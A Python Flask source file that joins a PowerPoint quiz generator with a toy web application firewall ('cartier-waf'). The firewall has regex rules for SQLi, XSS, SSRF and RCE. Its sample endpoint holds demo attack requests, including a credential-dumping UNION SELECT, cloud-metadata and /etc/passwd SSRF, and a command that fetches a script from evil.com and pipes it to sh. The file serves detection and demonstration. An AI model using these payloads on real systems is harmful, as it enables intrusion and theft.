import json
import os
import random
import re
from urllib.parse import unquote_plus, urlparse

from flask import Flask, request, jsonify, send_from_directory

try:
    import requests
except ImportError:
    requests = None

try:
    from pptx import Presentation
except ImportError:
    Presentation = None

app = Flask(__name__, static_folder="static", static_url_path="")

MIN_QUIZ_QUESTIONS = 3
MAX_QUIZ_QUESTIONS = 20
DEFAULT_QUIZ_QUESTIONS = 8
MAX_QUIZ_SOURCE_CHARS = 12000

GROQ_CHAT_URL = "https://api.groq.com/openai/v1/chat/completions"
DEFAULT_GROQ_MODEL = "llama-3.1-8b-instant"

QUIZ_TEMPLATES = {
    "easy": [
        {
            "question": "Which item would you expect on the title slide of {topic}?",
            "options": [
                "Project name",
                "Detailed metrics table",
                "Appendix notes",
                "Source code listing",
            ],
            "answer": "Project name",
            "explanation": "Title slides usually state the topic and presenter.",
        },
        {
            "question": "What is the purpose of the agenda slide?",
            "options": [
                "Outline key sections",
                "List citations only",
                "Show raw logs",
                "Display the final score",
            ],
            "answer": "Outline key sections",
            "explanation": "Agenda slides preview the flow of the talk.",
        },
        {
            "question": "Which section usually summarizes the main takeaways?",
            "options": [
                "Conclusion",
                "Data dump",
                "Glossary",
                "Appendix",
            ],
            "answer": "Conclusion",
            "explanation": "Conclusions highlight the key outcomes.",
        },
        {
            "question": "What does PPT stand for?",
            "options": [
                "PowerPoint Presentation",
                "Project Planning Template",
                "Program Portfolio Tracker",
                "Product Pitch Toolkit",
            ],
            "answer": "PowerPoint Presentation",
            "explanation": "PPT is the common extension for PowerPoint files.",
        },
        {
            "question": "Which file type is accepted by this app?",
            "options": [
                ".pptx",
                ".csv",
                ".mp4",
                ".exe",
            ],
            "answer": ".pptx",
            "explanation": "The app supports PowerPoint formats.",
        },
    ],
    "medium": [
        {
            "question": "Which metric best supports a main claim in {topic}?",
            "options": [
                "User retention",
                "Random color palette",
                "Office temperature",
                "Wallpaper choice",
            ],
            "answer": "User retention",
            "explanation": "Retention reflects sustained user value.",
        },
        {
            "question": "What does a pros/cons slide enable?",
            "options": [
                "Tradeoff analysis",
                "Code execution",
                "Database migration",
                "Expense approval",
            ],
            "answer": "Tradeoff analysis",
            "explanation": "Pros/cons help compare options objectively.",
        },
        {
            "question": "A chart with a steady upward trend most likely suggests what?",
            "options": [
                "Growth over time",
                "Data corruption",
                "Network outage",
                "No change",
            ],
            "answer": "Growth over time",
            "explanation": "Upward trends indicate improvement or growth.",
        },
        {
            "question": "Which slide should include sources for quoted data?",
            "options": [
                "Appendix or footnotes",
                "Title slide only",
                "Empty slide",
                "Speaker notes only",
            ],
            "answer": "Appendix or footnotes",
            "explanation": "Sources belong in citations or appendices.",
        },
        {
            "question": "If an action plan is included, what is a common element?",
            "options": [
                "Owner and due date",
                "Random emojis",
                "Unrelated stock photo",
                "Hidden text",
            ],
            "answer": "Owner and due date",
            "explanation": "Action plans need accountability and timelines.",
        },
    ],
    "hard": [
        {
            "question": "Which question best checks causal vs. correlational claims?",
            "options": [
                "Does the data prove cause or just association?",
                "Is the font size large enough?",
                "Are the colors matching?",
                "Is the slide count prime?",
            ],
            "answer": "Does the data prove cause or just association?",
            "explanation": "Causality needs stronger evidence than correlation.",
        },
        {
            "question": "What evidence most strengthens a KPI improvement claim?",
            "options": [
                "Before/after with a control baseline",
                "Anecdote only",
                "Single data point",
                "Unlabeled axis",
            ],
            "answer": "Before/after with a control baseline",
            "explanation": "Controlled comparisons build stronger claims.",
        },
        {
            "question": "Which risk should be captured on a decision slide?",
            "options": [
                "Key assumption that could fail",
                "Presenter's coffee order",
                "Room temperature",
                "Slide number parity",
            ],
            "answer": "Key assumption that could fail",
            "explanation": "Risks focus on assumptions and constraints.",
        },
        {
            "question": "Which validation method best supports a new feature proposal?",
            "options": [
                "A/B test results",
                "Random guess",
                "Unverified rumor",
                "Placeholder text",
            ],
            "answer": "A/B test results",
            "explanation": "Experiments provide measurable evidence.",
        },
        {
            "question": "Which statement shows the strongest synthesis?",
            "options": [
                "Insight + implication + next step",
                "List of unrelated facts",
                "Repeated headings",
                "Empty summary",
            ],
            "answer": "Insight + implication + next step",
            "explanation": "Synthesis links insight to action.",
        },
    ],
}

SQLI_RULES = [
    {
        "id": "sqli_union_select",
        "regex": r"\bunion\b\s+\bselect\b",
        "reason": "UNION SELECT sequence",
    },
    {
        "id": "sqli_boolean_tautology",
        "regex": r"\bor\b\s+1\s*=\s*1\b",
        "reason": "Boolean tautology (or 1=1)",
    },
    {
        "id": "sqli_select_from",
        "regex": r"\bselect\b\s+.+\bfrom\b",
        "reason": "SELECT ... FROM pattern",
    },
    {
        "id": "sqli_comment",
        "regex": r"(--|/\*|\*/)",
        "reason": "SQL comment marker",
    },
    {
        "id": "sqli_time_delay",
        "regex": r"\b(waitfor\s+delay|sleep\s*\()",
        "reason": "Time delay function",
    },
]

XSS_RULES = [
    {
        "id": "xss_script_tag",
        "regex": r"<\s*script\b",
        "reason": "Script tag",
    },
    {
        "id": "xss_event_handler",
        "regex": r"on\w+\s*=",
        "reason": "Inline event handler",
    },
    {
        "id": "xss_js_scheme",
        "regex": r"javascript\s*:",
        "reason": "javascript: URI scheme",
    },
    {
        "id": "xss_img_onerror",
        "regex": r"<\s*img\b[^>]*onerror\s*=",
        "reason": "Image onerror handler",
    },
    {
        "id": "xss_svg_onload",
        "regex": r"<\s*svg\b[^>]*onload\s*=",
        "reason": "SVG onload handler",
    },
]

RCE_RULES = [
    {
        "id": "rce_shell_chain",
        "regex": r"(;|\|\||&&|\|)\s*",
        "reason": "Shell command chain operator",
    },
    {
        "id": "rce_substitution",
        "regex": r"(\$\([^\)]+\)|`[^`]+`)",
        "reason": "Command substitution",
    },
    {
        "id": "rce_suspicious_binary",
        "regex": r"\b(bash|sh|cmd\.exe|powershell|nc|netcat|curl|wget|python\s+-c|perl\s+-e|php\s+-r)\b",
        "reason": "Suspicious binary invocation",
    },
]

SSRF_SCHEMES = ["file", "gopher", "dict", "ftp", "smb", "ldap"]
URL_REGEX = re.compile(r"https?://[^\s'\"<>]+", re.IGNORECASE)
SCHEME_REGEX = re.compile(r"\b(file|gopher|dict|ftp|smb|ldap)://", re.IGNORECASE)


def normalize(text: str) -> str:
    if not text:
        return ""
    value = text
    for _ in range(2):
        value = unquote_plus(value)
    return value


def clip(value: str, limit: int = 120) -> str:
    if len(value) <= limit:
        return value
    return value[: limit - 3] + "..."


def find_regex_evidence(rules, text: str):
    evidence = []
    for rule in rules:
        match = re.search(rule["regex"], text, flags=re.IGNORECASE | re.DOTALL)
        if match:
            evidence.append(
                {
                    "rule": rule["id"],
                    "match": clip(match.group(0)),
                    "reason": rule["reason"],
                }
            )
    return evidence


def is_internal_host(host: str) -> bool:
    if not host:
        return False
    host = host.lower()
    if host in {"localhost", "127.0.0.1", "0.0.0.0", "::1", "metadata"}:
        return True
    if host in {"metadata.google.internal", "host.docker.internal"}:
        return True
    if host.startswith("10.") or host.startswith("192.168.") or host.startswith("169.254."):
        return True
    if host.startswith("172."):
        parts = host.split(".")
        if len(parts) > 1:
            try:
                second = int(parts[1])
                if 16 <= second <= 31:
                    return True
            except ValueError:
                pass
    return False


def detect_ssrf(text: str):
    evidence = []
    for match in URL_REGEX.findall(text):
        try:
            parsed = urlparse(match)
            host = parsed.hostname
        except ValueError:
            host = None
        if host and is_internal_host(host):
            evidence.append(
                {
                    "rule": "ssrf_internal_host",
                    "match": clip(match),
                    "reason": f"Internal host target ({host})",
                }
            )
    for match in SCHEME_REGEX.findall(text):
        evidence.append(
            {
                "rule": "ssrf_unusual_scheme",
                "match": f"{match}://",
                "reason": "Unusual URL scheme",
            }
        )
    return evidence


def build_finding(name: str, evidence):
    score = min(1.0, 0.3 * len(evidence))
    if score >= 0.7:
        confidence = "high"
    elif score >= 0.4:
        confidence = "medium"
    else:
        confidence = "low"
    return {
        "attack": name,
        "score": round(score, 2),
        "confidence": confidence,
        "evidence": evidence,
    }


def analyze_payload(payload: str):
    normalized = normalize(payload)
    findings = []

    sqli_evidence = find_regex_evidence(SQLI_RULES, normalized)
    if sqli_evidence:
        findings.append(build_finding("SQLi", sqli_evidence))

    xss_evidence = find_regex_evidence(XSS_RULES, normalized)
    if xss_evidence:
        findings.append(build_finding("XSS", xss_evidence))

    ssrf_evidence = detect_ssrf(normalized)
    if ssrf_evidence:
        findings.append(build_finding("SSRF", ssrf_evidence))

    rce_evidence = find_regex_evidence(RCE_RULES, normalized)
    if rce_evidence:
        findings.append(build_finding("RCE", rce_evidence))

    summary = {
        "attack_detected": bool(findings),
        "top_attack": findings[0]["attack"] if findings else "None",
        "count": len(findings),
    }
    return {"summary": summary, "findings": findings}


def coerce_question_count(value) -> int:
    try:
        count = int(value)
    except (TypeError, ValueError):
        count = DEFAULT_QUIZ_QUESTIONS
    return max(MIN_QUIZ_QUESTIONS, min(MAX_QUIZ_QUESTIONS, count))


def topic_from_filename(filename: str) -> str:
    if not filename:
        return "Sample Deck"
    base = os.path.splitext(filename)[0].strip()
    return base if base else "Sample Deck"


def pick_templates(templates, count: int):
    if count <= len(templates):
        return random.sample(templates, count)
    picks = []
    while len(picks) < count:
        picks.extend(random.sample(templates, min(len(templates), count - len(picks))))
    return picks[:count]


def fill_template(template, topic: str):
    def replace(value):
        if isinstance(value, str):
            return value.replace("{topic}", topic)
        if isinstance(value, list):
            return [replace(item) for item in value]
        return value

    return {key: replace(value) for key, value in template.items()}


def build_mock_quiz(filename: str, difficulty: str, count: int):
    topic = topic_from_filename(filename)
    safe_difficulty = difficulty if difficulty in QUIZ_TEMPLATES else "easy"
    templates = QUIZ_TEMPLATES[safe_difficulty]
    selected = pick_templates(templates, count)
    questions = [fill_template(item, topic) for item in selected]
    return {
        "title": f"{topic} — Quiz",
        "difficulty": safe_difficulty,
        "count": len(questions),
        "source": "mock",
        "questions": questions,
    }


def extract_pptx_text(ppt_file) -> str:
    if ppt_file is None or Presentation is None:
        return ""
    filename = getattr(ppt_file, "filename", "") or ""
    if filename and not filename.lower().endswith(".pptx"):
        return ""
    try:
        ppt_file.stream.seek(0)
        prs = Presentation(ppt_file.stream)
    except Exception:
        return ""
    texts = []
    for slide in prs.slides:
        for shape in slide.shapes:
            if hasattr(shape, "text") and shape.text:
                texts.append(shape.text)
            if getattr(shape, "has_table", False):
                for row in shape.table.rows:
                    for cell in row.cells:
                        if cell.text:
                            texts.append(cell.text)
        if slide.has_notes_slide and slide.notes_slide.notes_text_frame:
            notes = slide.notes_slide.notes_text_frame.text
            if notes:
                texts.append(notes)
    ppt_file.stream.seek(0)
    cleaned = [text.strip() for text in texts if text and text.strip()]
    return "\n".join(cleaned)


def truncate_source(text: str, limit: int = MAX_QUIZ_SOURCE_CHARS) -> str:
    if len(text) <= limit:
        return text
    return text[:limit].rstrip() + "\n[TRUNCATED]"


def parse_json_response(content: str):
    if not content:
        return None
    try:
        return json.loads(content)
    except json.JSONDecodeError:
        start = content.find("{")
        end = content.rfind("}")
        if start == -1 or end == -1 or end <= start:
            return None
        try:
            return json.loads(content[start : end + 1])
        except json.JSONDecodeError:
            return None


def normalize_quiz_payload(payload, filename: str, difficulty: str, count: int):
    if not isinstance(payload, dict):
        return None
    raw_questions = payload.get("questions")
    if raw_questions is None and isinstance(payload.get("quiz"), dict):
        raw_questions = payload["quiz"].get("questions")
    if not isinstance(raw_questions, list):
        return None

    normalized = []
    for item in raw_questions:
        if not isinstance(item, dict):
            continue
        question = item.get("question") or item.get("prompt")
        options = item.get("options") or item.get("choices")
        answer = item.get("answer") or item.get("correct") or item.get("correct_answer")
        explanation = item.get("explanation") or item.get("reasoning") or ""

        if isinstance(options, dict):
            options = list(options.values())
        if isinstance(options, list):
            options = [str(opt) for opt in options if str(opt).strip()]
        else:
            options = []

        if not question or len(options) < 2:
            continue

        normalized.append(
            {
                "question": str(question),
                "options": options[:4],
                "answer": str(answer) if answer else options[0],
                "explanation": str(explanation) if explanation else "",
            }
        )

    if not normalized:
        return None

    if len(normalized) < count:
        filler = build_mock_quiz(filename, difficulty, count - len(normalized))["questions"]
        normalized.extend(filler)

    topic = topic_from_filename(filename)
    return {
        "title": payload.get("title") or f"{topic} — Quiz",
        "difficulty": payload.get("difficulty") or difficulty,
        "count": min(len(normalized), count),
        "source": payload.get("source") or "groq",
        "questions": normalized[:count],
    }


def build_groq_prompt(topic: str, deck_text: str, difficulty: str, count: int) -> str:
    source = deck_text.strip()
    if not source:
        source = f"No slide text available. Build a quiz about {topic}."
    source = truncate_source(source)
    return (
        "You are a quiz designer. Create multiple-choice questions from the slide text.\n"
        f"Difficulty: {difficulty}. Number of questions: {count}.\n"
        "Return ONLY valid JSON with this exact schema:\n"
        "{\n"
        '  \"title\": \"...\",\n'
        '  \"difficulty\": \"easy|medium|hard\",\n'
        '  \"questions\": [\n'
        "    {\n"
        '      \"question\": \"...\",\n'
        '      \"options\": [\"A\", \"B\", \"C\", \"D\"],\n'
        '      \"answer\": \"one of the options\",\n'
        '      \"explanation\": \"1-2 sentences\"\n'
        "    }\n"
        "  ]\n"
        "}\n"
        "Slide text:\n"
        f"{source}\n"
    )


def build_quiz_with_groq(filename: str, difficulty: str, count: int, deck_text: str):
    api_key = os.getenv("GROQ_API_KEY", "").strip()
    if not api_key:
        return None
    if requests is None:
        return None

    model = os.getenv("GROQ_MODEL", DEFAULT_GROQ_MODEL).strip() or DEFAULT_GROQ_MODEL
    topic = topic_from_filename(filename)
    prompt = build_groq_prompt(topic, deck_text, difficulty, count)

    try:
        response = requests.post(
            GROQ_CHAT_URL,
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
            },
            json={
                "model": model,
                "messages": [
                    {
                        "role": "system",
                        "content": "You generate quizzes and respond with JSON only.",
                    },
                    {"role": "user", "content": prompt},
                ],
                "temperature": 0.3,
            },
            timeout=90,
        )
        response.raise_for_status()
        payload = response.json()
        content = payload.get("choices", [{}])[0].get("message", {}).get("content", "")
    except requests.RequestException:
        return None
    except ValueError:
        return None

    parsed = parse_json_response(content)
    return normalize_quiz_payload(parsed, filename, difficulty, count)


@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


@app.route("/api/quiz", methods=["POST", "OPTIONS"])
def quiz():
    if request.method == "OPTIONS":
        return ("", 204)

    difficulty = (request.form.get("difficulty") or "easy").lower()
    count = coerce_question_count(request.form.get("count"))
    ppt_file = request.files.get("ppt") or request.files.get("file")
    filename = ppt_file.filename if ppt_file else "Sample Deck"
    deck_text = extract_pptx_text(ppt_file)

    api_url = os.getenv("QUIZ_API_URL", "").strip()
    if api_url:
        if requests is None:
            return (
                jsonify(
                    {
                        "error": "requests not installed",
                        "hint": "Add requests to requirements.txt",
                    }
                ),
                500,
            )
        try:
            files = None
            if ppt_file:
                files = {
                    "ppt": (
                        ppt_file.filename,
                        ppt_file.stream,
                        ppt_file.mimetype or "application/vnd.ms-powerpoint",
                    )
                }
            payload = {"difficulty": difficulty, "count": str(count)}
            headers = {}
            api_key = os.getenv("QUIZ_API_KEY", "").strip()
            if api_key:
                headers["Authorization"] = f"Bearer {api_key}"
            response = requests.post(
                api_url, data=payload, files=files, headers=headers, timeout=90
            )
            response.raise_for_status()
            return jsonify(response.json())
        except requests.RequestException as exc:
            return (
                jsonify({"error": "Quiz API request failed", "details": str(exc)}),
                502,
            )
        except ValueError:
            return jsonify({"error": "Quiz API returned non-JSON response"}), 502

    groq_quiz = build_quiz_with_groq(filename, difficulty, count, deck_text)
    if groq_quiz:
        return jsonify(groq_quiz)

    quiz_payload = build_mock_quiz(filename, difficulty, count)
    return jsonify(quiz_payload)


@app.route("/api/samples")
def samples():
    return jsonify(
        {
            "clean": {
                "method": "GET",
                "url": "https://shop.example.com/products?id=24",
                "headers": "User-Agent: CartierTest\nAccept: */*",
                "body": "",
            },
            "sqli_union": {
                "method": "GET",
                "url": "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                "headers": "User-Agent: CartierTest\nAccept: */*",
                "body": "",
            },
            "sqli_boolean": {
                "method": "GET",
                "url": "https://shop.example.com/login?user=admin' OR 1=1--",
                "headers": "User-Agent: CartierTest\nAccept: */*",
                "body": "",
            },
            "xss_script": {
                "method": "GET",
                "url": "https://shop.example.com/search?q=<script>alert(1)</script>",
                "headers": "User-Agent: CartierTest\nAccept: */*",
                "body": "",
            },
            "xss_event": {
                "method": "GET",
                "url": "https://shop.example.com/profile?bio=<img src=x onerror=alert(1)>",
                "headers": "User-Agent: CartierTest\nAccept: */*",
                "body": "",
            },
            "ssrf_meta": {
                "method": "POST",
                "url": "https://shop.example.com/fetch",
                "headers": "Content-Type: application/json",
                "body": '{"url":"http://169.254.169.254/latest/meta-data/iam"}',
            },
            "ssrf_file": {
                "method": "POST",
                "url": "https://shop.example.com/fetch",
                "headers": "Content-Type: application/json",
                "body": '{"url":"file:///etc/passwd"}',
            },
            "rce_chain": {
                "method": "POST",
                "url": "https://shop.example.com/convert",
                "headers": "Content-Type: application/x-www-form-urlencoded",
                "body": "file=report.pdf;curl http://evil.com/s.sh|sh",
            },
            "rce_subst": {
                "method": "POST",
                "url": "https://shop.example.com/convert",
                "headers": "Content-Type: application/x-www-form-urlencoded",
                "body": "file=report.pdf&format=pdf$(id)",
            },
        }
    )


@app.route("/api/analyze", methods=["POST", "OPTIONS"])
def analyze():
    if request.method == "OPTIONS":
        return ("", 204)
    data = request.get_json(silent=True) or {}
    method = data.get("method", "")
    url = data.get("url", "")
    headers = data.get("headers", "")
    body = data.get("body", "")
    payload = data.get("payload")
    if not payload:
        payload = f"{method} {url}\n{headers}\n\n{body}"
    result = analyze_payload(payload)
    return jsonify(result)


@app.route("/health")
def health():
    return jsonify({"status": "ok", "service": "cartier-waf"})


if __name__ == "__main__":
    port = int(os.getenv("PORT", "8000"))
    debug = os.getenv("FLASK_DEBUG", "").lower() in {"1", "true", "yes"}
    app.run(host="0.0.0.0", port=port, debug=debug)
